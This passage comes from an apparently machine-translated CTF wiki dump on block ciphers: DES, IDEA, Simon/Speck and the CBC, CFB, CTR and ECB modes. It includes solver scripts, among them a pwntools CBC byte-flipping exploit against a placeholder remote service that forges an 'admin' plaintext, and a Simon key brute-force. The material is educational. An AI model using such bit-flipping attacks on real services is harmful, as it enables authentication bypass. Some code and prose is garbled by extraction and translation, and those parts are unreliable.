0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0]], [[1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0], [1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0], [1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0], [0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1], [0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0], [0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1], [1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0], [1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1], [1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1], [1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1], [1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1]]]\n\n\n\n    def permute(self, lst, tb):\n\n        return [lst[i-1] for i in tb]\n\n\n\n    def f(self,riti,subkeyi):\n\n        tmp = [i^j for i,j in zip(subkeyi,self.permute(riti,DES.E))]\n\n        return  self.permute(sum([[int(l) for l in str(bin(DES.Sbox[i][int(str(tmp[6*i])+str(tmp[6*i+5]),2)][int(\"\".join(str(j) for j in tmp[6*i+1:6*i+5]),2)])[2:].zfill(4))] for i in range(8)],[]),DES.Pbox)\n\n\n\n    def des_main(self,m,mark):\n\n        sbkey = self.subkey[0]\n\n        #if mark == 'e' else self.subkey[1]\n\n        # tmp =  self.permute([int(i) for i in list((m).ljust(64,\"0\"))],self.IP)\n\n        tmp =  [int(i) for i in list((m).ljust(64,\"0\"))]\n</code></pre> <p>global kkk print (kkk)             for i in range(kkk):</p> <pre><code>            tmp = tmp[32:] + [j^k for j,k in zip(tmp[:32],self.f(tmp[32:],sbkey[i if mark != 'd' else kkk-1-i]))]\n\n        return \"\".join([str(i) for i in self.permute(tmp[32:]+tmp[:32],self.IP_re)])\n\n\n\n    def des_encipher(self,m):\n\n        m = \"\".join([bin(ord(i))[2:].zfill(8) for i in m])\n</code></pre> <p>des_en = self.des_main (m, 'e')             return \"\".join([chr(int(des_en[i8:i8+8],2)) for i in range(8)])</p> <pre><code>    def des_decipher(self,c):\n\n        c = \"\".join([bin(ord(i))[2:].zfill(8) for i in c])\n</code></pre> <p>des_de = self.des_main (c, 'd')             return \"\".join([chr(int(des_de[i8:i8+8],2)) for i in range(8)])</p> <pre><code>def test():\n\n    import base64\n</code></pre> <p>global kkk         while kkk &gt;=0:</p> <p>desobj = DES ()             # cipher = desobj.des_encipher(\"12345678\")</p> <pre><code>        cipher = '\\x01\\x19\\xe1+\\x92\\xd9\\x15%'\n\n        message1 = desobj.des_decipher(cipher)\n\n        print(message1)\n</code></pre> <p>kkk = 1     if name=='main':</p> <pre><code>    test()\n\n\n\n```\n</code></pre> <p>Decryption result (partial):</p> <pre><code>14\nt-\u00cfE\u00cfx\u0090\u00a7\n\n13\n\ny0ur9Ood\n12\n\n\u03bcp ^ \u00db\u00e9 = \u00b9\n11\n\n) \u00c1`r\u00fb\u00d5\u00fb\n</code></pre> <p>It can be seen that n is 13, and flag is <code>flag{y0ur9Ood}</code></p>"},{"location":"crypto/blockcipher/des/#reference","title":"Reference","text":"<p>Tsinghua University graduate data security courseware - https://en.wikipedia.org/wiki/Data_Encryption_Standard</p>"},{"location":"crypto/blockcipher/idea/","title":"IDEA","text":""},{"location":"crypto/blockcipher/idea/#overview","title":"Overview","text":"<p>**International Data Encryption Algorithm (IDEA), first known as the Improved Proposed Encryption Standard (IPES), is a symmetric key block cipher in cryptography. James Massey and Lai Xuejia Design, first introduced in 1991. This algorithm was proposed to replace the old data encryption standard DES. (from Wikipedia)</p>"},{"location":"crypto/blockcipher/idea/#basic-process","title":"Basic Process","text":""},{"location":"crypto/blockcipher/idea/#key-generation","title":"Key Generation","text":"<p>IDEA uses 6 keys in each round of encryption and then 4 keys in the final output round. So there are a total of 52.</p> <ol> <li>The first 8 keys are from the original key of the algorithm, K1 is taken from the upper 16 bits of the key, and K8 is taken from the lower 16 bits of the key.</li> <li>Move the key loop left by 25 bits to get the next round key, and then divide it into 8 groups again.</li> </ol>"},{"location":"crypto/blockcipher/idea/#encryption-process","title":"Encryption process","text":"<p>The IDEA encrypted block is 64 bits in size and uses a key length of 128 bits. The algorithm performs the same transformation 8 times on the input data block, except that the key used each time is different, and finally an output transformation is performed. Each round of operation</p> <p></p> <p>Both input and output can be a group of 16 bits. The main execution of each round has</p> <ul> <li>Bitwise XOR, \u2295</li> <li>Modular plus, the modulus is 2^{16}, \u229e</li> <li>Modular multiplication, the modulus is 2^{16}+1, \u2299. However, it should be noted that the input of 0x0000 will be modified to 2^{16}, and the output of 2^{16} will be modified to 0x0000.</li> </ul> <p>Here we call the encryption method of the middle square consisting of K5 and K6 as MA. This is also an important part of the IDEA algorithm. In addition, we call MA_L the left side result of this part of the encryption, which will end up with the leftmost 16 bits; MA_R is the result of the encrypted right part of the part, and finally Will work with the third 16 bits.</p> <p>The operation of the last output wheel is as follows</p> <p></p>"},{"location":"crypto/blockcipher/idea/#decryption-process","title":"Decryption process","text":"<p>The decryption process is similar to the encryption process, mainly in the selection of its key.</p> <ul> <li>The first 4 subkeys of the decrypted key of the i(1-9)th round are derived from the first 4 subkeys of the 10<sup>th</sup>-ith round of the encryption process</li> <li>where the 1<sup>st</sup> and 4<sup>th</sup> decryption subkeys are the multiplicative inverses of the corresponding subkeys for 2^{16}+1.</li> <li>The second and third subkeys are taken as</li> <li>When the number of rounds is 2, ..., 8, the encrypted inverse of 2^{16} of the corresponding 3<sup>rd</sup> and 2<sup>nd</sup> subkeys is taken.</li> <li>When the number of rounds is 1 or 9, the encrypted inverse of 2^{16} corresponding to the corresponding 2<sup>nd</sup> and 3<sup>rd</sup> subkeys is taken.</li> <li>The 5<sup>th</sup> and 6<sup>th</sup> keys are unchanged.</li> </ul>"},{"location":"crypto/blockcipher/idea/#overall-process","title":"Overall process","text":"<p>Let's prove the correctness of the algorithm. Here we focus on the first round of the decryption algorithm. First, let's first look at how Y_i is obtained.</p> <p>$ Y_1 = W_ {81}  odot Z_ {49} $</p> <p>$ Y_2 = W_ {83}  boxplus Z_ {50} $</p> <p>$ Y_3 = W_ {82}  boxplus Z_ {51} $</p> <p>$ Y_4 = W_ {83}  odot Z_ {52} $</p> <p>When decrypting, the first round of direct conversion is</p> <p>$ J_ {11} = Y_1  odot U_1 = Y_1  odot Z_ {49} ^ {- 1} = W_ {81} $</p> <p>$ J_ {12} = Y_2  boxplus U2 = Y_2  boxplus Z_ {50} ^ {- 1} = W_ {83} $</p> <p>$ J_ {13} = Y_3  boxplus U3 = Y_3  boxplus Z_ {51} ^ {- 1} = W_ {82} $</p> <p>$ J_ {14} = Y_4  odot U_4 = Y_4  odot Z_ {52} ^ {- 1} = W_ {84} $</p> <p>It can be seen that the result is only the opposite of the two 16-bit encryption results in the middle. Let's take a closer look at how W_{8i} was obtained.</p> <p>$ W_ {81} = I_ {81}  oplus MA_R (I_ {81}  oplus I_ {83}, I_ {82}  oplus I_ {84}) $</p> <p>$ W_ {82} = I_ {83}  oplus MA_R (I_ {81}  oplus I_ {83}, I_ {82}  oplus I_ {84}) $</p> <p>$ W_ {83} = I_ {82}  oplus MA_L (I_ {81}  oplus I_ {83}, I_ {82}  oplus I_ {84}) $</p> <p>$ W_ {84} = I_ {84}  oplus MA_L (I_ {81}  oplus I_ {83}, I_ {82}  oplus I_ {84}) $</p> <p>So for V11</p> <p>$ V_ {11} = J_ {11}  oplus MA_R (J_ {11}  oplus J_ {13}, J_ {12}  oplus J_ {14}) $</p> <p>By simply bringing in the existing values, obviously</p> <p>$ V_ {11} = W_ {81}  oplus MA_R (I_ {81}  oplus I_ {83}, I_ {82}  oplus I_ {84}) = I_ {81} $</p> <p>For other elements, it is similar, then we will find that the first round of decryption results are exactly I_{81}, I_{83}, I_{82}, I_{84}.</p> <p>Similarly, this relationship can be satisfied until</p> <p>$ V_ {81} = I_ {11}, V_ {82} = I_ {13}, V_ {83} = I_ {12}, V_ {84} = I_ {14} $</p> <p>Then finally a simple output transformation happens to get the value that was originally encrypted.</p> <p></p>"},{"location":"crypto/blockcipher/idea/#topic","title":"topic","text":"<ul> <li>2017 HITCON seccomp</li> </ul>"},{"location":"crypto/blockcipher/introduction/","title":"\u5757\u52a0\u5bc6","text":""},{"location":"crypto/blockcipher/introduction/#overview","title":"Overview","text":"<p>The so-called block encryption is to encrypt a piece of plaintext each time. Common encryption algorithms are available.</p> <ul> <li>IDEA encryption</li> <li>DES encryption</li> <li>AES encryption</li> </ul> <p>Block encryption is also symmetric encryption.</p> <p>In fact, we can also understand block encryption as a special alternative password, but each time it is replaced by a large block. It is precisely because of a large block, the plaintext space is huge, and for different keys, we can't make a table to correspond to the corresponding ciphertext, so we must have ** complex ** encryption and decryption algorithm to encrypt and decrypt the ciphertext .</p> <p>At the same time, plain text can often be very long or short, so two blocks are often needed for block encryption.</p> <ul> <li>padding, ie padding to the specified packet length</li> <li>Packet encryption mode, which is the way in which plaintext packets are encrypted.</li> </ul>"},{"location":"crypto/blockcipher/introduction/#basic-strategy","title":"Basic strategy","text":"<p>In the design of block ciphers, Shannon proposed two strategies: confusion and diffusion.</p>"},{"location":"crypto/blockcipher/introduction/#confusion","title":"Confusion","text":"<p>Confusion, Confusion, makes the statistical relationship between the ciphertext and the key as complex as possible, so that the attacker can not guess the key even if it acquires some statistical characteristics of the ciphertext. Generally, complex nonlinear transformations can be used to get a good confusion. The common methods are as follows:</p> <ul> <li>S box</li> <li>Multiplication</li> </ul>"},{"location":"crypto/blockcipher/introduction/#diffusion","title":"Diffusion","text":"<p>Diffusion, Diffusion, makes every bit in the plaintext affect many bits in the ciphertext. Common methods are</p> <ul> <li>Linear transformation</li> <li>replacement</li> <li>shift, rotate</li> </ul>"},{"location":"crypto/blockcipher/introduction/#common-encryption-and-decryption-structure","title":"Common encryption and decryption structure","text":"<p>The main block block encryption currently used is the structure.</p> <ul> <li>Iterative structure, because the iterative structure is easy to design and implement, while facilitating security assessment.</li> </ul>"},{"location":"crypto/blockcipher/introduction/#iterative-structure","title":"Iterative structure","text":""},{"location":"crypto/blockcipher/introduction/#overview_1","title":"Overview","text":"<p>The iterative structure is basically as follows, generally consisting of three parts</p> <ul> <li>Key replacement</li> <li>Round encryption function</li> <li>Round decryption function</li> </ul> <p></p>"},{"location":"crypto/blockcipher/introduction/#round-function","title":"Round Function","text":"<p>At present, the main functions of the round function are mainly the following design methods.</p> <ul> <li>Feistel Network, invented by Horst Feistel, one of the DES designers.</li> <li>DES</li> <li> <p>Substitution-Permutation Network(SPN)</p> <ul> <li>AES</li> </ul> </li> <li> <p>Other programs</p> </li> </ul>"},{"location":"crypto/blockcipher/introduction/#key-expansion","title":"Key Expansion","text":"<p>At present, there are many methods for key expansion. There is no perfect key expansion method. The basic principle is that each bit of the key affects multiple rounds of round keys as much as possible.</p>"},{"location":"crypto/blockcipher/simon-speck/","title":"Simon and Speck Block Ciphers","text":"<p>This is a set of sister lightweight encryption.</p>"},{"location":"crypto/blockcipher/simon-speck/#simon-block-cipher","title":"Simon Block Cipher","text":""},{"location":"crypto/blockcipher/simon-speck/#basic-introduction","title":"basic introduction","text":"<p>The Simon block encryption algorithm was released by the NSA in June 2013 and was optimized primarily on the Hardware Implementation.</p> <p>Simon Block Cipher is a balanced [Feistel cipher] (https://en.wikipedia.org/wiki/Feistel_cipher) encryption. There are two blocks. If the size of each block is n bits, the size of the plaintext is 2n bits. Further, in general, the key length used in the encryption is an integer multiple of the block length, such as 2n, 4n, and the like. Common Simon encryption algorithms are available</p> <p></p> <p>In general, the Simon algorithm is called Simon 2n/nm, where n is the block size and m is the multiple between the block size and the key. For example, Simon 48/96 means that the text is 48 bits and the key is a 96-bit encryption algorithm.</p> <p>In addition, for the Simon block encryption algorithm, the encryption process is the same for each round, as follows</p> <p></p> <p>Of course, the keys will be different for each round and for different m.</p> <p></p> <p>Where z_j is generated by the Linear Feedback Shift Register (LFSR), although the logic for the different z_j is different, the initial vector is fixed.</p> <p>|                 Constant                 |</p> <p>| :--------------------------------------: |</p> <p>| $ z_ {0} $ = 11111010001001010110000111001101111101000100101011000011100110 | | $ z_ {1} $ = 10001110111110010011000010110101000111011111001001100001011010 | | $ z_ {2} $ = 10101111011100000011010010011000101000010001111110010110110011 | | $ z_ {3} $ = 11011011101011000110010111100000010010001010011100110100001111 | | $ z_ {4} $ = 11010001111001101011011000100000010111000011001010010011101111 |</p>"},{"location":"crypto/blockcipher/simon-speck/#2017-seccon-simon-and-speck-block-ciphers","title":"2017 SECCON Simon and Speck Block Ciphers","text":"<p>The title is described below</p> <pre><code>Simon and Speck Block Ciphers\n\n\n\nhttps://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5\n</code></pre> <p>It can be seen from the name that the key is 96 bits (12 bytes), the plaintext is 64 bits (8 bytes), and the key has been given 8 bytes, leaving only four bytes unknown. Then we can use the method of brute force. Here is a simon encryption algorithm from https://github.com/bozhu/NSA-ciphers/blob/master/simon.py.</p> <p>details as follows</p> <pre><code>from pwn import *\n\nfrom simon import SIMON\n\n\n\nplain = 0x6d564d37426e6e71\n\ncipher = 0xbb5d12ba422834b5\n\n\n\n\n\ndef compare(key):\n\n    key = \"SECCON{\" + key + \"}\"\n\n    key = key.encode('hex')\n\n    key = int(key, 16)\n\n    my_simon = SIMON(64, 96, key)\n\n    test = my_simon.encrypt(plain)\n\n    if test == cipher:\n\n        return True\n\n    else:\n\n        return False\n\n\n\n\n\ndef solve():\n\n    visible = string.uppercase + string.lowercase + string.digits + string.punctuation + \" \"\n\nkey = pwnlib.util.iters.mbruteforce (compare, visible, 4, method = &amp;quot;fixed&amp;quot;)\n    print key\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    solve()\n</code></pre> <p>Results are as follows</p> <pre><code>\u279c  2017_seccon_simon_and_speck_block_ciphers git:(master) python exp.py\n\n[+] MBruteforcing: Found key: \"6Pz0\"\n</code></pre>"},{"location":"crypto/blockcipher/simon-speck/#references","title":"references","text":"<ul> <li>https://en.wikipedia.org/wiki/Simon_(cipher)</li> </ul>"},{"location":"crypto/blockcipher/mode/cbc/","title":"CBC","text":"<p>CBC is called the Cipher-block chaining mode, here</p> <ul> <li>IV does not require confidentiality</li> <li>IV must be unpredictable and must be complete.</li> </ul>"},{"location":"crypto/blockcipher/mode/cbc/#encryption","title":"Encryption","text":""},{"location":"crypto/blockcipher/mode/cbc/#decryption","title":"decryption","text":""},{"location":"crypto/blockcipher/mode/cbc/#advantages-and-disadvantages","title":"Advantages and disadvantages","text":""},{"location":"crypto/blockcipher/mode/cbc/#advantages","title":"Advantages","text":"<ol> <li>The ciphertext block is not only related to the current ciphertext block, but also related to the previous ciphertext block or IV, hiding the statistical properties of the plaintext.</li> <li>Has a limited two-step error propagation feature, that is, a one-bit change in the ciphertext block only affects the current ciphertext block and the next ciphertext block.</li> <li>With self-synchronization feature, that is, the k-th block is correct, the k+1th block can be decrypted normally.</li> </ol>"},{"location":"crypto/blockcipher/mode/cbc/#disadvantages","title":"Disadvantages","text":"<ol> <li>Encryption cannot be parallel, decryption can be parallel.</li> </ol>"},{"location":"crypto/blockcipher/mode/cbc/#application","title":"Application","text":"<p>CBC is widely used</p> <ul> <li>Common data encryption and TLS encryption.</li> <li>Integrity and identity authentication.</li> </ul>"},{"location":"crypto/blockcipher/mode/cbc/#attack","title":"Attack","text":""},{"location":"crypto/blockcipher/mode/cbc/#byte-reversal-attack","title":"Byte reversal attack","text":""},{"location":"crypto/blockcipher/mode/cbc/#principle","title":"Principle","text":"<p>The principle of byte inversion is very simple, we observe the ** decryption process ** can find the following characteristics:</p> <ul> <li>IV vector affects the first plaintext grouping</li> <li>The nth ciphertext packet can affect the n + 1 plaintext packet</li> </ul> <p>Assuming that the n ciphertext is grouped as C_n, the decrypted n plaintext is grouped as P_n.</p> <p>Then P_{n+1}=C_n~\\text{xor}~f(C_{n+1}).</p> <p>The f function is \\text{Block Cipher Decryption} in the figure.</p> <p>For the original text and ciphertext of a certain information, then we can modify the n ciphertext block C_n to C_n~\\text{xor}~P_{n+1}~\\text{xor}~ A. Then decrypt the ciphertext, then the decrypted n plaintext will soon become A.</p>"},{"location":"crypto/blockcipher/mode/cbc/#example","title":"Example","text":"<pre><code>from flag import FLAG\n\nfrom Crypto.Cipher import AES\n\nfrom Crypto import Random\n\nimport base64\n\n\n\nBLOCK_SIZE=16\n\nIV = Random.new().read(BLOCK_SIZE)\n\npassphrase = Random.new().read(BLOCK_SIZE)\n\n\n\npad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)\n\nunpad = lambda s: s [: - ord (s [len (s) - 1:])]\n\n\nprefix = \"flag=\"+FLAG+\"&amp;userdata=\"\n\nsuffix = \"&amp;user=guest\"\n\ndef menu():\n\n    print \"1. encrypt\"\n\n    print \"2. decrypt\"\n\n    return raw_input(\"&gt; \")\n\n\n\ndef encrypt():\n\n    data = raw_input(\"your data: \")\n\n    plain = prefix+data+suffix\n\n    aes = AES.new(passphrase, AES.MODE_CBC, IV)\n\n    print base64.b64encode(aes.encrypt(pad(plain)))\n\n\n\n\n\ndef decrypt():\n\n    data = raw_input(\"input data: \")\n\n    aes = AES.new(passphrase, AES.MODE_CBC, IV)\n\nplain = unpad (aes.decrypt (base64.b64decode (data)))\n    print 'DEBUG ====&gt; ' + plain\n\n    if plain[-5:]==\"admin\":\n\n        print plain\n\n    else:\n\n        print \"you are not admin\"\n\n\n\ndef main():\n\n    for _ in range(10):\n\n        cmd = menu()\n\n        if cmd==\"1\":\n\n            encrypt()\n\nelif cmd == &amp;quot;2&amp;quot;:\n            decrypt()\n\n        else:\n\n            exit()\n\n\n\nif __name__==\"__main__\":\n\n    main()\n</code></pre> <p>Visible topic I hope we provide an encrypted string, if the final content of this string is admin. The program will output clear text. Therefore, the problem flow is to provide a plain text first, and then modify the ciphertext so that the final content of the decrypted string is admin. We can enumerate the length of the flag to determine where we need to modify it.</p> <p>The following is exp.py</p> <pre><code>from pwn import *\n\nimport base64\n\n\n\npad = 16\n\ndata = 'a' * pad\n\nfor x in range(10, 100):\n\n    r = remote('xxx.xxx.xxx.xxx', 10004)\n\n    #r = process('./chall.sh')\n\n\n\n    r.sendlineafter('&gt; ', '1')\n\n    r.sendlineafter('your data: ', data)\n\n    cipher = list(base64.b64decode(r.recv()))\n\n    #print 'cipher ===&gt;', ''.join(cipher)\n\n\n\n    BLOCK_SIZE = 16\n\n    prefix = \"flag=\" + 'a' * x + \"&amp;userdata=\"\n    suffix = \"&amp;user=guest\"\n\n    plain = prefix + data + suffix\n\n\n\n    idx = (22 + x + pad) % BLOCK_SIZE + ((22 + x + pad) / BLOCK_SIZE - 1) * BLOCK_SIZE\n\n    cipher[idx + 0] = chr(ord(cipher[idx + 0]) ^ ord('g') ^ ord('a'))\n\n    cipher[idx + 1] = chr(ord(cipher[idx + 1]) ^ ord('u') ^ ord('d'))\n\n    cipher[idx + 2] = chr(ord(cipher[idx + 2]) ^ ord('e') ^ ord('m'))\n\n    cipher[idx + 3] = chr(ord(cipher[idx + 3]) ^ ord('s') ^ ord('i'))\n\n    cipher[idx + 4] = chr(ord(cipher[idx + 4]) ^ ord('t') ^ ord('n'))\n\n\n\n    r.sendlineafter('&gt; ', '2')\n\n    r.sendlineafter('input data: ', base64.b64encode(''.join(cipher)))\n\n\n\n    msg = r.recvline()\n\n    if 'you are not admin' not in msg:\n\n        print msg\n\n        break\n\n    r.close()  \n</code></pre>"},{"location":"crypto/blockcipher/mode/cbc/#padding-oracle-attack","title":"Padding Oracle Attack","text":"<p>See the introduction below for details.</p>"},{"location":"crypto/blockcipher/mode/cfb/","title":"CFB","text":"<p>The CFB is called the Cipher feedback.</p>"},{"location":"crypto/blockcipher/mode/cfb/#encryption","title":"Encryption","text":""},{"location":"crypto/blockcipher/mode/cfb/#decryption","title":"decryption","text":""},{"location":"crypto/blockcipher/mode/cfb/#advantages-and-disadvantages","title":"Advantages and disadvantages","text":""},{"location":"crypto/blockcipher/mode/cfb/#advantages","title":"Advantages","text":"<ul> <li>Adapt to different data format requirements</li> <li>Limited error propagation</li> <li>Self synchronization</li> </ul>"},{"location":"crypto/blockcipher/mode/cfb/#disadvantages","title":"Disadvantages","text":"<ul> <li>Encryption cannot be parallelized, decryption cannot be parallel</li> </ul>"},{"location":"crypto/blockcipher/mode/cfb/#application-scenario","title":"Application Scenario","text":"<p>This mode is suitable for database encryption, wireless communication encryption and other encryption environments that have special requirements on data formats.</p>"},{"location":"crypto/blockcipher/mode/cfb/#topic","title":"topic","text":"<ul> <li>HITCONCTF-Quals-2015-Simple- (Crypto-100)</li> </ul>"},{"location":"crypto/blockcipher/mode/ctr/","title":"CTR","text":"<p>The CTR is called the Counter mode, which is designed by Diffe and Hellman.</p>"},{"location":"crypto/blockcipher/mode/ctr/#encryption","title":"Encryption","text":""},{"location":"crypto/blockcipher/mode/ctr/#decryption","title":"decryption","text":""},{"location":"crypto/blockcipher/mode/ctr/#topic","title":"topic","text":"<ul> <li> <p>2017 star ctf ssss</p> </li> <li> <p>2017 star ctf ssss2</p> </li> </ul>"},{"location":"crypto/blockcipher/mode/ecb/","title":"ECB","text":"<p>The ECB mode is called the electronic codebook mode.</p>"},{"location":"crypto/blockcipher/mode/ecb/#encryption","title":"Encryption","text":""},{"location":"crypto/blockcipher/mode/ecb/#decryption","title":"decryption","text":""},{"location":"crypto/blockcipher/mode/ecb/#advantages-and-disadvantages","title":"Advantages and disadvantages","text":""},{"location":"crypto/blockcipher/mode/ecb/#advantages","title":"Advantages","text":"<ol> <li>Simple to implement.</li> <li>Encryption of different plaintext packets can be calculated in parallel, which is fast.</li> </ol>"},{"location":"crypto/blockcipher/mode/ecb/#disadvantages","title":"Disadvantages","text":"<ol> <li>The same plaintext block will be encrypted into the same ciphertext block, and the statistical rules of the plaintext grouping will not be hidden. As shown below</li> </ol> <p>In order to solve the problem that the unified plaintext generates the same ciphertext, other encryption modes are proposed.</p>"},{"location":"crypto/blockcipher/mode/ecb/#typical-application","title":"typical application","text":"<ol> <li>Encryption protection for random numbers.</li> <li>Encryption for single-packet plaintext.</li> </ol>"},{"location":"crypto/blockcipher/mode/ecb/#2016-abctf-aes-mess-75","title":"2016 ABCTF aes-mess-75","text":"<p>The title is described below</p> <pre><code>We encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this?\n\n\n\n[HINT] There has to be some way to work backwards, right?\n</code></pre> <p>It can be seen that this encryption is an ECB encryption, then AES is a group of 16 bytes, each byte can be represented by two hexadecimal characters, so we group each 32 characters and then correspond Search in the txt file.</p> <p>Corresponding flag</p> <pre><code>e220eb994c8fc16388dbd60a969d4953 abctf{looks_like\n\nf042fc0bce25dbef573cf522636a1ba3 _you_can_break_a\n\nfafa1a7c21ff824a5824c5dc4a376e75 is}\n</code></pre> <p>The last 